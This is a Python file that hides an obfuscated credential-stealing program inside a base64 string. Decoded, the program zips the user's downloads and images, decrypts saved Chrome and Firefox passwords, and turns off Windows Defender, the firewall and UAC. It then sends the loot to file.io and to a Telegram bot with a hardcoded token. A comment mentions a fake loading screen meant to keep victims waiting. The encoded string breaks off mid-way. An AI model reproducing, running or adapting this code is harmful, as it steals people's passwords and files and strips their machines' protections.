
import base64
import marshal

# Dữ liệu mã hóa base64
encoded_data = b'CmltcG9ydCB0aW1lIAppbXBvcnQgdGhyZWFkaW5nICAKaW1wb3J0IHNodXRpbCAKaW1wb3J0IG9zIAppbXBvcnQgc3lzCmltcG9ydCB6aXBmaWxlCmltcG9ydCBzcWxpdGUzCmltcG9ydCBiYXNlNjQKaW1wb3J0IGpzb24KaW1wb3J0IHBsYXRmb3JtCmltcG9ydCBzb2NrZXQKaW1wb3J0IHBzdXRpbAppbXBvcnQgc3lzCmltcG9ydCByZXF1ZXN0cwppbXBvcnQgdHJhY2ViYWNrCmltcG9ydCBkYXRldGltZQppbXBvcnQgY29uY3VycmVudC5mdXR1cmVzCgppZiBvcy5uYW1lID09ICJudCI6CiAgICBpbXBvcnQgd2luMzJjcnlwdAogICAgaW1wb3J0IHNodXRpbCAKICAgIGZyb20gQ3J5cHRvLkNpcGhlciBpbXBvcnQgQUVTCiAgICAKc3lzLnN0ZGVyciA9IG9wZW4ob3MuZGV2bnVsbCwgJ3cnKQoKZGVmIGdldF9wdWJsaWNfaXAoKToKICAgIHRyeToKICAgICAgICByZXNwb25zZSA9IHJlcXVlc3RzLmdldCgiaHR0cHM6Ly9hcGk2NC5pcGlmeS5vcmc/Zm9ybWF0PWpzb24iKQogICAgICAgIGlmIHJlc3BvbnNlLnN0YXR1c19jb2RlID09IDIwMDoKICAgICAgICAgICAgcmV0dXJuIHJlc3BvbnNlLmpzb24oKVsiaXAiXQogICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOgogICAgICAgIHJldHVybiBmIkzhu5dpOiB7ZX0iCgpkZWYgZ2V0X3BjX2luZm8oKToKICAgIGluZm8gPSB7fQogICAgaW5mb1siU3lzdGVtIl0gPSBwbGF0Zm9ybS5zeXN0ZW0oKQogICAgaW5mb1siTm9kZSBOYW1lIl0gPSBwbGF0Zm9ybS5ub2RlKCkKICAgIGluZm9bIlJlbGVhc2UiXSA9IHBsYXRmb3JtLnJlbGVhc2UoKQogICAgaW5mb1siVmVyc2lvbiJdID0gcGxhdGZvcm0udmVyc2lvbigpCiAgICBpbmZvWyJNYWNoaW5lIl0gPSBwbGF0Zm9ybS5tYWNoaW5lKCkKICAgIGluZm9bIlByb2Nlc3NvciJdID0gcGxhdGZvcm0ucHJvY2Vzc29yKCkKICAgIGluZm9bIlJBTSJdID0gc3RyKHJvdW5kKHBzdXRpbC52aXJ0dWFsX21lbW9yeSgpLnRvdGFsIC8gKDEwMjQgKiogMykpKSArICIgR0IiICAKICAgIGluZm9bIkNQVSBVc2FnZSJdID0gc3RyKHBzdXRpbC5jcHVfcGVyY2VudCgpKSArICIlIiAgCiAgICBpbmZvWyJEaXNrIFVzYWdlIl0gPSBzdHIocHN1dGlsLmRpc2tfdXNhZ2UoJy8nKS5wZXJjZW50KSArICIlIiAgCiAgICBpbmZvWyJOZXR3b3JrIEluZm8iXSA9IHN0cihnZXRfcHVibGljX2lwKCkpCiAgICByZXR1cm4gaW5mbwoKZGVmIGdldF9hbmRyb2lkX2luZm8oKToKICAgIGluZm8gPSB7fQogICAgdHJ5OgogICAgICAgIGluZm9bIkRldmljZSBOYW1lIl0gPSBvcy5wb3BlbigiZ2V0cHJvcCByby5wcm9kdWN0Lm1vZGVsIikucmVhZCgpLnN0cmlwKCkKICAgICAgICBpbmZvWyJBbmRyb2lkIFZlcnNpb24iXSA9IG9zLnBvcGVuKCJnZXRwcm9wIHJvLmJ1aWxkLnZlcnNpb24ucmVsZWFzZSIpLnJlYWQoKS5zdHJpcCgpCiAgICAgICAgaW5mb1siUkFNIl0gPSBvcy5wb3BlbigiZnJlZSAtaCB8IGdyZXAgTWVtIHwgYXdrICd7cHJpbnQgJDJ9JyIpLnJlYWQoKS5zdHJpcCgpICAKICAgICAgICBpbmZvWyJDUFUgVXNhZ2UiXSA9IG9zLnBvcGVuKCJ0b3AgLWJuMSB8IGdyZXAgJ0NwdShzKScgfCBhd2sgJ3twcmludCAxMDAgLSAkOH0nIikucmVhZCgpLnN0cmlwKCkgKyAnJScKICAgICAgICBpbmZvWyJOZXR3b3JrIEluZm8iXSA9IHN0cihnZXRfcHVibGljX2lwKCkpCiAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6CiAgICAgICAgaW5mb1siRXJyb3IiXSA9ICJLaMO0bmcgdGjhu4MgdHJ1eSBj4bqtcCB0aMO0bmcgdGluIEFuZHJvaWQ6ICIgKyBzdHIoZSkKICAgIHJldHVybiBpbmZvCgpkZWYgc2F2ZV9pbmZvX3RvX2ZpbGUoZmlsZV9uYW1lPSJzeXN0ZW0udHh0Iik6CiAgICBzeXN0ZW1faW5mbyA9IHt9CiAgICBjdXJyZW50X3BsYXRmb3JtID0gcGxhdGZvcm0uc3lzdGVtKCkubG93ZXIoKSAgICAKICAgIGlmIGN1cnJlbnRfcGxhdGZvcm0gPT0gIndpbmRvd3MiOgogICAgICAgIHN5c3RlbV9pbmZvWyJQQyBJbmZvIl0gPSBnZXRfcGNfaW5mbygpCiAgICBlbGlmIGN1cnJlbnRfcGxhdGZvcm0gPT0gImxpbnV4IjoKICAgICAgICBpZiBvcy5wYXRoLmV4aXN0cygiL2RhdGEvZGF0YS9jb20udGVybXV4Iik6CiAgICAgICAgICAgIHN5c3RlbV9pbmZvWyJBbmRyb2lkIEluZm8iXSA9IGdldF9hbmRyb2lkX2luZm8oKQogICAgICAgIGVsc2U6CiAgICAgICAgICAgIHN5c3RlbV9pbmZvWyJQQyBJbmZvIl0gPSBnZXRfcGNfaW5mbygpCiAgICBlbHNlOgogICAgICAgIHN5c3RlbV9pbmZvWyJFcnJvciJdID0gIk7hu4FuIHThuqNuZyBraMO0bmcgaOG7lyB0cuG7oyIgICAgCiAgICB3aXRoIG9wZW4oZmlsZV9uYW1lLCAndycpIGFzIGY6CiAgICAgICAgaWYgIkVycm9yIiBpbiBzeXN0ZW1faW5mbzoKICAgICAgICAgICAgZi53cml0ZShzeXN0ZW1faW5mb1siRXJyb3IiXSArICJcbiIpCiAgICAgICAgZWxzZToKICAgICAgICAgICAgZm9yIGNhdGVnb3J5LCBkZXRhaWxzIGluIHN5c3RlbV9pbmZvLml0ZW1zKCk6CiAgICAgICAgICAgICAgICBmLndyaXRlKGYie2NhdGVnb3J5fTpcbiIpCiAgICAgICAgICAgICAgICBmb3Iga2V5LCB2YWx1ZSBpbiBkZXRhaWxzLml0ZW1zKCk6CiAgICAgICAgICAgICAgICAgICAgZi53cml0ZShmIiAge2tleX06IHt2YWx1ZX1cbiIpCiAgICAgICAgICAgICAgICBmLndyaXRlKCJcbiIpCgpkZWYgY29tcHJlc3NfZG93bmxvYWRfZm9sZGVyKG91dHB1dF9maWxlbmFtZT0iRmlsZS56aXAiKToKICAgIGlmIG9zLm5hbWUgPT0gIm50IjogIAogICAgICAgIGRvd25sb2FkX3BhdGggPSBvcy5wYXRoLmpvaW4ob3MuZW52aXJvblsiVVNFUlBST0ZJTEUiXSwgIkRvd25sb2FkcyIpCiAgICBlbGlmIG9zLm5hbWUgPT0gInBvc2l4IjogIAogICAgICAgIHBvc3NpYmxlX3BhdGhzID0gWwogICAgICAgICAgICAiL3N0b3JhZ2UvZW11bGF0ZWQvMC9Eb3dubG9hZCIsICAKICAgICAgICAgICAgIi9zZGNhcmQvRG93bmxvYWQiLCAgICAgICAgICAgICAKICAgICAgICAgICAgb3MucGF0aC5leHBhbmR1c2VyKCJ+L0Rvd25sb2FkcyIpICAKICAgICAgICBdCiAgICAgICAgZG93bmxvYWRfcGF0aCA9IE5vbmUKICAgICAgICBmb3IgcGF0aCBpbiBwb3NzaWJsZV9wYXRoczoKICAgICAgICAgICAgaWYgb3MucGF0aC5leGlzdHMocGF0aCk6CiAgICAgICAgICAgICAgICBkb3dubG9hZF9wYXRoID0gcGF0aAogICAgICAgICAgICAgICAgYnJlYWsKICAgICAgICBpZiBub3QgZG93bmxvYWRfcGF0aDoKICAgICAgICAgICAgcmFpc2UgRmlsZU5vdEZvdW5kRXJyb3IoIktow7RuZyB0w6xtIHRo4bqleSB0aMawIG3hu6VjIERvd25sb2Fkcy4iKQogICAgZWxzZToKICAgICAgICByYWlzZSBFeGNlcHRpb24oIlVuc3VwcG9ydGVkIHBsYXRmb3JtLiIpCiAgICBvdXRwdXRfemlwID0gb3MucGF0aC5qb2luKG9zLmdldGN3ZCgpLCBvdXRwdXRfZmlsZW5hbWUpCiAgICB3aXRoIHppcGZpbGUuWmlwRmlsZShvdXRwdXRfemlwLCAndycsIHppcGZpbGUuWklQX0RFRkxBVEVEKSBhcyB6aXBmOgogICAgICAgIGZvciByb290LCBkaXJzLCBmaWxlcyBpbiBvcy53YWxrKGRvd25sb2FkX3BhdGgpOgogICAgICAgICAgICBmb3IgbmFtZSBpbiBkaXJzOgogICAgICAgICAgICAgICAgZm9sZGVyX3BhdGggPSBvcy5wYXRoLmpvaW4ocm9vdCwgbmFtZSkKICAgICAgICAgICAgICAgIGZvbGRlcl96aXBfbmFtZSA9IGYie25hbWV9LnppcCIKICAgICAgICAgICAgICAgIGZvbGRlcl96aXBfcGF0aCA9IG9zLnBhdGguam9pbihkb3dubG9hZF9wYXRoLCBmb2xkZXJfemlwX25hbWUpCiAgICAgICAgICAgICAgICB3aXRoIHppcGZpbGUuWmlwRmlsZShmb2xkZXJfemlwX3BhdGgsICd3JywgemlwZmlsZS5aSVBfREVGTEFURUQpIGFzIGZvbGRlcl96aXA6CiAgICAgICAgICAgICAgICAgICAgZm9yIGZvbGRlcl9yb290LCBfLCBmb2xkZXJfZmlsZXMgaW4gb3Mud2Fsayhmb2xkZXJfcGF0aCk6CiAgICAgICAgICAgICAgICAgICAgICAgIGZvciBmaWxlIGluIGZvbGRlcl9maWxlczoKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGFic19maWxlX3BhdGggPSBvcy5wYXRoLmpvaW4oZm9sZGVyX3Jvb3QsIGZpbGUpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBhcmNuYW1lID0gb3MucGF0aC5yZWxwYXRoKGFic19maWxlX3BhdGgsIGZvbGRlcl9wYXRoKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgZm9sZGVyX3ppcC53cml0ZShhYnNfZmlsZV9wYXRoLCBhcmNuYW1lKQogICAgICAgICAgICAgICAgemlwZi53cml0ZShmb2xkZXJfemlwX3BhdGgsIG9zLnBhdGgucmVscGF0aChmb2xkZXJfemlwX3BhdGgsIGRvd25sb2FkX3BhdGgpKQogICAgICAgICAgICAgICAgb3MucmVtb3ZlKGZvbGRlcl96aXBfcGF0aCkgIAogICAgICAgICAgICBmb3IgbmFtZSBpbiBmaWxlczoKICAgICAgICAgICAgICAgIGZpbGVfcGF0aCA9IG9zLnBhdGguam9pbihyb290LCBuYW1lKQogICAgICAgICAgICAgICAgaWYgbmFtZSA9PSBvdXRwdXRfZmlsZW5hbWU6ICAKICAgICAgICAgICAgICAgICAgICBjb250aW51ZQogICAgICAgICAgICAgICAgemlwZi53cml0ZShmaWxlX3BhdGgsIG9zLnBhdGgucmVscGF0aChmaWxlX3BhdGgsIGRvd25sb2FkX3BhdGgpKQoKZGVmIGNvbXByZXNzX2FsbF9pbWFnZXMob3V0cHV0X3ppcD0iSW1hZ2VzLnppcCIpOgogICAgaWYgb3MubmFtZSA9PSAibnQiOiAgCiAgICAgICAgcm9vdF9kaXJzID0gW29zLmVudmlyb25bIlVTRVJQUk9GSUxFIl1dICAKICAgIGVsaWYgb3MubmFtZSA9PSAicG9zaXgiOiAgCiAgICAgICAgcm9vdF9kaXJzID0gWwogICAgICAgICAgICAiL3N0b3JhZ2UvZW11bGF0ZWQvMCIsICAKICAgICAgICAgICAgIi9zZGNhcmQiLCAgICAgICAgICAgICAgCiAgICAgICAgICAgIG9zLnBhdGguZXhwYW5kdXNlcigifiIpICAKICAgICAgICBdCiAgICBlbHNlOgogICAgICAgIHJhaXNlIEV4Y2VwdGlvbigiVW5zdXBwb3J0ZWQgcGxhdGZvcm0uIikKICAgIGltYWdlX2V4dGVuc2lvbnMgPSAoIi5qcGciLCAiLmpwZWciLCAiLnBuZyIsICIuZ2lmIiwgIi5ibXAiLCAiLnRpZmYiLCAiLndlYnAiKQogICAgd2l0aCB6aXBmaWxlLlppcEZpbGUob3V0cHV0X3ppcCwgJ3cnLCB6aXBmaWxlLlpJUF9ERUZMQVRFRCkgYXMgemlwZjoKICAgICAgICBmb3Igcm9vdF9kaXIgaW4gcm9vdF9kaXJzOgogICAgICAgICAgICBpZiBub3Qgb3MucGF0aC5leGlzdHMocm9vdF9kaXIpOgogICAgICAgICAgICAgICAgY29udGludWUKICAgICAgICAgICAgZm9yIHJvb3QsIF8sIGZpbGVzIGluIG9zLndhbGsocm9vdF9kaXIpOgogICAgICAgICAgICAgICAgZm9yIGZpbGUgaW4gZmlsZXM6CiAgICAgICAgICAgICAgICAgICAgaWYgZmlsZS5sb3dlcigpLmVuZHN3aXRoKGltYWdlX2V4dGVuc2lvbnMpOgogICAgICAgICAgICAgICAgICAgICAgICBmdWxsX3BhdGggPSBvcy5wYXRoLmpvaW4ocm9vdCwgZmlsZSkKICAgICAgICAgICAgICAgICAgICAgICAgYXJjbmFtZSA9IG9zLnBhdGgucmVscGF0aChmdWxsX3BhdGgsIHJvb3RfZGlyKSAgCiAgICAgICAgICAgICAgICAgICAgICAgIHppcGYud3JpdGUoZnVsbF9wYXRoLCBhcmNuYW1lKQoKZGVmIGRlY3J5cHRfcGFzc3dvcmQoZW5jcnlwdGVkX3Bhc3N3b3JkLCBrZXkpOgogICAgdHJ5OgogICAgICAgIGl2ID0gZW5jcnlwdGVkX3Bhc3N3b3JkWzM6MTVdCiAgICAgICAgZW5jcnlwdGVkX3Bhc3N3b3JkID0gZW5jcnlwdGVkX3Bhc3N3b3JkWzE1Ol0KICAgICAgICBjaXBoZXIgPSBBRVMubmV3KGtleSwgQUVTLk1PREVfR0NNLCBpdikKICAgICAgICByZXR1cm4gY2lwaGVyLmRlY3J5cHQoZW5jcnlwdGVkX3Bhc3N3b3JkKVs6LTE2XS5kZWNvZGUoKQogICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOgogICAgICAgIHJldHVybiBOb25lCgpkZWYgZ2V0X2Nocm9tZV9lbmNyeXB0aW9uX2tleSgpOgogICAgbG9jYWxfc3RhdGVfcGF0aCA9IG9zLnBhdGguam9pbigKICAgICAgICBvcy5lbnZpcm9uWydVU0VSUFJPRklMRSddLCByIkFwcERhdGFcTG9jYWxcR29vZ2xlXENocm9tZVxVc2VyIERhdGFcTG9jYWwgU3RhdGUiCiAgICApCiAgICB0cnk6CiAgICAgICAgd2l0aCBvcGVuKGxvY2FsX3N0YXRlX3BhdGgsICdyJywgZW5jb2Rpbmc9J3V0Zi04JykgYXMgZmlsZToKICAgICAgICAgICAgbG9jYWxfc3RhdGUgPSBqc29uLmxvYWRzKGZpbGUucmVhZCgpKQogICAgICAgIGVuY3J5cHRlZF9rZXkgPSBiYXNlNjQuYjY0ZGVjb2RlKGxvY2FsX3N0YXRlWydvc19jcnlwdCddWydlbmNyeXB0ZWRfa2V5J10pWzU6XQogICAgICAgIHJldHVybiB3aW4zMmNyeXB0LkNyeXB0VW5wcm90ZWN0RGF0YShlbmNyeXB0ZWRfa2V5LCBOb25lLCBOb25lLCBOb25lLCAwKVsxXQogICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOgogICAgICAgIHJldHVybiBOb25lCgpkZWYgZ2V0X2Nocm9tZV9wYXNzd29yZHMoKToKICAgIGtleSA9IGdldF9jaHJvbWVfZW5jcnlwdGlvbl9rZXkoKQogICAgaWYgbm90IGtleToKICAgICAgICByZXR1cm4gIktow7RuZyB0aOG7gyBs4bqleSBrZXkgbcOjIGjDs2EgdOG7qyBDaHJvbWUuIiAgICAKICAgIGRiX3BhdGggPSBvcy5wYXRoLmpvaW4oCiAgICAgICAgb3MuZW52aXJvblsnVVNFUlBST0ZJTEUnXSwgciJBcHBEYXRhXExvY2FsXEdvb2dsZVxDaHJvbWVcVXNlciBEYXRhXERlZmF1bHRcTG9naW4gRGF0YSIKICAgICkKICAgIHRlbXBfZGJfcGF0aCA9IGRiX3BhdGggKyAiX3RlbXAiCiAgICBzaHV0aWwuY29weWZpbGUoZGJfcGF0aCwgdGVtcF9kYl9wYXRoKSAgICAKICAgIHRyeToKICAgICAgICBjb25uID0gc3FsaXRlMy5jb25uZWN0KHRlbXBfZGJfcGF0aCkKICAgICAgICBjdXJzb3IgPSBjb25uLmN1cnNvcigpCiAgICAgICAgY3Vyc29yLmV4ZWN1dGUoIlNFTEVDVCBvcmlnaW5fdXJsLCB1c2VybmFtZV92YWx1ZSwgcGFzc3dvcmRfdmFsdWUgRlJPTSBsb2dpbnMiKQogICAgICAgIGRhdGEgPSBbXQogICAgICAgIGZvciByb3cgaW4gY3Vyc29yLmZldGNoYWxsKCk6CiAgICAgICAgICAgIHVybCA9IHJvd1swXQogICAgICAgICAgICB1c2VybmFtZSA9IHJvd1sxXQogICAgICAgICAgICBlbmNyeXB0ZWRfcGFzc3dvcmQgPSByb3dbMl0KICAgICAgICAgICAgcGFzc3dvcmQgPSBkZWNyeXB0X3Bhc3N3b3JkKGVuY3J5cHRlZF9wYXNzd29yZCwga2V5KQogICAgICAgICAgICBpZiBwYXNzd29yZDoKICAgICAgICAgICAgICAgIGRhdGEuYXBwZW5kKGYie3VybH0gfCB7dXNlcm5hbWV9IHwge3Bhc3N3b3JkfSIpCiAgICAgICAgY3Vyc29yLmNsb3NlKCkKICAgICAgICBjb25uLmNsb3NlKCkKICAgICAgICBvcy5yZW1vdmUodGVtcF9kYl9wYXRoKQogICAgICAgIHJldHVybiBkYXRhCiAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6CiAgICAgICAgb3MucmVtb3ZlKHRlbXBfZGJfcGF0aCkKICAgICAgICByZXR1cm4gW10KCmRlZiBnZXRfZmlyZWZveF9wYXNzd29yZHMoKToKICAgIHRyeToKICAgICAgICBmaXJlZm94X3Byb2ZpbGUgPSBvcy5wYXRoLmpvaW4oCiAgICAgICAgICAgIG9zLmVudmlyb25bJ0FQUERBVEEnXSwgciJNb3ppbGxhXEZpcmVmb3hcUHJvZmlsZXMiCiAgICAgICAgKQogICAgICAgIHByb2ZpbGVzID0gb3MubGlzdGRpcihmaXJlZm94X3Byb2ZpbGUpCiAgICAgICAgZm9yIHByb2ZpbGUgaW4gcHJvZmlsZXM6CiAgICAgICAgICAgIGxvZ2luX2RiID0gb3MucGF0aC5qb2luKGZpcmVmb3hfcHJvZmlsZSwgcHJvZmlsZSwgImxvZ2lucy5qc29uIikKICAgICAgICAgICAgaWYgb3MucGF0aC5leGlzdHMobG9naW5fZGIpOgogICAgICAgICAgICAgICAgd2l0aCBvcGVuKGxvZ2luX2RiLCAncicsIGVuY29kaW5nPSd1dGYtOCcpIGFzIGZpbGU6CiAgICAgICAgICAgICAgICAgICAgbG9naW5zID0ganNvbi5sb2FkKGZpbGUpCiAgICAgICAgICAgICAgICBkYXRhID0gW10KICAgICAgICAgICAgICAgIGZvciBsb2dpbiBpbiBsb2dpbnNbJ2xvZ2lucyddOgogICAgICAgICAgICAgICAgICAgIGRhdGEuYXBwZW5kKGYie2xvZ2luWydob3N0bmFtZSddfSB8IHtsb2dpblsnZW5jcnlwdGVkVXNlcm5hbWUnXX0gfCB7bG9naW5bJ2VuY3J5cHRlZFBhc3N3b3JkJ119IikKICAgICAgICAgICAgICAgIHJldHVybiBkYXRhCiAgICAgICAgcmV0dXJuICJLaMO0bmcgdMOsbSB0aOG6pXkgdGjDtG5nIHRpbiB04burIEZpcmVmb3guIgogICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOgogICAgICAgIHJldHVybiAiS2jDtG5nIHRo4buDIGzhuqV5IGThu68gbGnhu4d1IHThu6sgRmlyZWZveC4iICAgIAoKZGVmIGNvbXByZXNzX2ZpbGVzX2RhdGFfdG9femlwKG91dHB1dF96aXA9IkJyb3dzZXIuemlwIik6CiAgICBvcGVuKCJjaHJvbWUudHh0IiwgJ3cnKS53cml0ZShnZXRfY2hyb21lX3Bhc3N3b3JkcygpKQogICAgb3BlbigiZmlyZWZveC50eHQiLCAndycpLndyaXRlKGdldF9maXJlZm94X3Bhc3N3b3JkcygpKQogICAgd2l0aCB6aXBmaWxlLlppcEZpbGUob3V0cHV0X3ppcCwgJ3cnLCB6aXBmaWxlLlpJUF9ERUZMQVRFRCkgYXMgemlwZjoKICAgICAgICBmb3IgZmlsZSBpbiBbImNocm9tZS50eHQiLCAiZmlyZWZveC50eHQiXToKICAgICAgICAgICAgaWYgb3MucGF0aC5leGlzdHMoZmlsZSk6CiAgICAgICAgICAgICAgICB6aXBmLndyaXRlKGZpbGUsIG9zLnBhdGguYmFzZW5hbWUoZmlsZSkpCiAgICAgICAgICAgICAgICBvcy5yZW1vdmUoZmlsZSkKICAgIApkZWYgc2VuZF9maWxlX3RvX2JvdChmaWxlX3BhdGgsIGxpbmspOgogICAgdHJ5OgogICAgICAgIHRva2VuID0gIjc2OTc1NjQ2Mzk6QUFHZjdGeDhxOEZaS0N1VVQ0R2pzSVhVd09RRVNPTzdNOWciCiAgICAgICAgY2hhdF9pZCA9ICI2MTg2NjIxODE1IgogICAgICAgIHVybCA9IGYiaHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdHt0b2tlbn0vc2VuZERvY3VtZW50IgogICAgICAgIHdpdGggb3BlbihmaWxlX3BhdGgsICdyYicpIGFzIGZpbGU6CiAgICAgICAgICAgIGRhdGEgPSB7CiAgICAgICAgICAgICAgICAnY2hhdF9pZCc6IGNoYXRfaWQsICAKICAgICAgICAgICAgICAgICdjYXB0aW9uJzogZicnJ0FwZGh5IEJPVE5FVCAKPj4+IERhdGUgVGltZToge2RhdGV0aW1lLmRhdGV0aW1lLm5vdygpLnN0cmZ0aW1lKCclWS0lbS0lZCAlSDolTTolUycpfSA8PDwKPj4+IExpbms6IHtsaW5rfSA8PDwKPj4+IFRow7RuZyB0aW4gbcOheSDEkcOjIGhhY2shIDw8PAo+Pj4gQVBESFkgQk9UTkVUIDw8PAo+Pj4gU1lTIExvYWRpbmcgRjIgPDw8JycnLAogICAgICAgICAgICB9CiAgICAgICAgICAgIGZpbGVzID0gewogICAgICAgICAgICAgICAgJ2RvY3VtZW50JzogZmlsZQogICAgICAgICAgICB9CiAgICAgICAgICAgIHJlcXVlc3RzLnBvc3QodXJsLCBkYXRhPWRhdGEsIGZpbGVzPWZpbGVzKQogICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOgogICAgICAgIHByaW50KGYiTOG7l2k6IHtlfSIpCgpkZWYgdXBsb2FkX2ZpbGUoZmlsZV9wYXRoKToKICAgIHRyeToKICAgICAgICB3aXRoIG9wZW4oZmlsZV9wYXRoLCAicmIiKSBhcyBmaWxlOgogICAgICAgICAgICBmaWxlcyA9IHsnZmlsZSc6IChmaWxlX3BhdGgsIGZpbGUpfQogICAgICAgICAgICB0cnk6CiAgICAgICAgICAgICAgICByZXNwb25zZSA9IHJlcXVlc3RzLnBvc3QoJ2h0dHBzOi8vZmlsZS5pby8nLCBmaWxlcz1maWxlcykKICAgICAgICAgICAgICAgIHJlc3BvbnNlLnJhaXNlX2Zvcl9zdGF0dXMoKQogICAgICAgICAgICAgICAgZGF0YSA9IHJlc3BvbnNlLmpzb24oKQogICAgICAgICAgICAgICAgcmV0dXJuIGRhdGEuZ2V0KCdsaW5rJywgJ0xpbmsgbm90IGZvdW5kIGluIHJlc3BvbnNlJykKICAgICAgICAgICAgZXhjZXB0IHJlcXVlc3RzLmV4Y2VwdGlvbnMuUmVxdWVzdEV4Y2VwdGlvbiBhcyBlOgogICAgICAgICAgICAgICAgcmV0dXJuIGYiRXJyb3IgZHVyaW5nIHJlcXVlc3Q6IHtlfSIKICAgIGV4Y2VwdCBGaWxlTm90Rm91bmRFcnJvcjoKICAgICAgICByZXR1cm4gIkZpbGUgbm90IGZvdW5kISIKCmxpc3RfZmlsZV9zZW5kX3RlbGUgPSBbXQoKZGVmIHN0ZWFsZXIoKToKICAgIHRyeToKICAgICAgICBzYXZlX2luZm9fdG9fZmlsZSgic3lzdGVtLnR4dCIpICAgICAgICAKICAgICAgICBjb21wcmVzc19kb3dubG9hZF9mb2xkZXIoIkZpbGUuemlwIikKICAgICAgICBsaXN0X2ZpbGVfc2VuZF90ZWxlLmFwcGVuZCgiRmlsZS56aXAiKQogICAgICAgIGNvbXByZXNzX2FsbF9pbWFnZXMoIkltYWdlcy56aXAiKQogICAgICAgIGxpc3RfZmlsZV9zZW5kX3RlbGUuYXBwZW5kKCJJbWFnZXMuemlwIikKICAgICAgICBpZiBvcy5uYW1lID09ICdudCc6ICAgICAgICAgICAgCiAgICAgICAgICAgIG9zLnN5c3RlbSgncmVnIGFkZCAiSEtMTVxcU09GVFdBUkVcXFBvbGljaWVzXFxNaWNyb3NvZnRcXFdpbmRvd3MgRGVmZW5kZXIiIC92IERpc2FibGVBbnRpU3B5d2FyZSAvdCBSRUdfRFdPUkQgL2QgMSAvZicpCiAgICAgICAgICAgIG9zLnN5c3RlbSgncmVnIGFkZCAiSEtMTVxcU09GVFdBUkVcXFBvbGljaWVzXFxNaWNyb3NvZnRcXFdpbmRvd3MgRGVmZW5kZXIiIC92IERpc2FibGVSb3V0aW5lbHlUYWtpbmdBY3Rpb24gL3QgUkVHX0RXT1JEIC9kIDEgL2YnKQogICAgICAgICAgICBvcy5zeXN0ZW0oJ3JlZyBhZGQgIkhLTE1cXFNPRlRXQVJFXFxQb2xpY2llc1xcTWljcm9zb2Z0XFxXaW5kb3dzIERlZmVuZGVyIiAvdiBEaXNhYmxlUmVhbHRpbWVNb25pdG9yaW5nIC90IFJFR19EV09SRCAvZCAxIC9mJykKICAgICAgICAgICAgb3Muc3lzdGVtKCduZXRzaCBhZHZmaXJld2FsbCBzZXQgYWxscHJvZmlsZXMgc3RhdGUgb2ZmJykKICAgICAgICAgICAgb3Muc3lzdGVtKCdyZWcgYWRkICJIS0VZX0xPQ0FMX01BQ0hJTkVcXFNPRlRXQVJFXFxNaWNyb3NvZnRcXFdpbmRvd3NcXEN1cnJlbnRWZXJzaW9uXFxQb2xpY2llc1xcU3lzdGVtIiAvdiBFbmFibGVMVUEgL3QgUkVHX0RXT1JEIC9kIDAgL2YnKQogICAgICAgICAgICBvcy5zeXN0ZW0oJ3NjIGNvbmZpZyBXaW5EZWZlbmQgc3RhcnQ9IGRpc2FibGVkICYmIHNjIHN0b3AgV2luRGVmZW5kJykKICAgICAgICAgICAgb3Muc3lzdGVtKCdzYyBjb25maWcgd3Njc3ZjIHN0YXJ0PSBkaXNhYmxlZCAmJiBzYyBzdG9wIHdzY3N2YycpCiAgICAgICAgICAgIGNvbXByZXNzX2ZpbGVzX2RhdGFfdG9femlwKCJCcm93c2VyLnppcCIpCiAgICAgICAgICAgIGxpc3RfZmlsZV9zZW5kX3RlbGUuYXBwZW5kKCJCcm93c2VyLnppcCIpCiAgICAgICAgb3V0X3ppcCA9IGYie2dldF9wdWJsaWNfaXAoKX0uemlwIgogICAgICAgIHdpdGggemlwZmlsZS5aaXBGaWxlKG91dF96aXAsICd3JywgemlwZmlsZS5aSVBfREVGTEFURUQpIGFzIHppcGY6CiAgICAgICAgICAgIGZvciBmaWxlIGluIGxpc3RfZmlsZV9zZW5kX3RlbGU6CiAgICAgICAgICAgICAgICBpZiBvcy5wYXRoLmV4aXN0cyhmaWxlKToKICAgICAgICAgICAgICAgICAgICB6aXBmLndyaXRlKGZpbGUsIG9zLnBhdGguYmFzZW5hbWUoZmlsZSkpICAKICAgICAgICAgICAgICAgICAgICBvcy5yZW1vdmUoZmlsZSkgICAgICAgIAogICAgICAgIGlmIG9zLnBhdGguZXhpc3RzKCJzeXN0ZW0udHh0Iik6CiAgICAgICAgICAgIGlmIG9zLnBhdGguZXhpc3RzKG91dF96aXApOgogICAgICAgICAgICAgICAgZmlsZV9wYXRoID0gb3MucGF0aC5qb2luKG9zLmdldGN3ZCgpLCBvdXRfemlwKQogICAgICAgICAgICAgICAgbGluayA9IHVwbG9hZF9maWxlKGZpbGVfcGF0aCkKICAgICAgICAgICAgc2VuZF9maWxlX3RvX2JvdCgic3lzdGVtLnR4dCIsIGxpbmspCiAgICAgICAgICAgIG9zLnJlbW92ZSgic3lzdGVtLnR4dCIpCiAgICAgICAgICAgIG9zLnJlbW92ZShvdXRfemlwKSAgICAgICAKICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZToKICAgICAgICBwcmludChmIkzhu5dpOiB7ZX0iKQoKd2l0aCBjb25jdXJyZW50LmZ1dHVyZXMuVGhyZWFkUG9vbEV4ZWN1dG9yKG1heF93b3JrZXJzPTEpIGFzIGV4ZWN1dG9yOgogICAgZnV0dXJlcyA9IFtdCiAgICBmdXR1cmVzLmFwcGVuZChleGVjdXRvci5zdWJtaXQoc3RlYWxlcikpCiAgICBjb25jdXJyZW50LmZ1dHVyZXMud2FpdChmdXR1cmVzKQogICAgZm9yIGZ1dHVyZSBpbiBmdXR1cmVzOgogICAgICAgIGZ1dHVyZS5yZXN1bHQoKSAgCgojIFRow7RuZyB0aW4gVGVsZWdyYW0gQm90ClRPS0VOID0gIjc2OTc1NjQ2Mzk6QUFHZjdGeDhxOEZaS0N1VVQ0R2pzSVhVd09RRVNPTzdNOWciCkNIQVRfSUQgPSAiNjE4NjYyMTgxNSIKVEVMRUdSQU1fVVJMID0gZiJodHRwczovL2FwaS50ZWxlZ3JhbS5vcmcvYm90e1RPS0VOfS9zZW5kRG9jdW1lbnQiCgojIEZha2UgbG9hZGluZyDEkeG7gyBnaeG7ryBu4bqhbiBuaM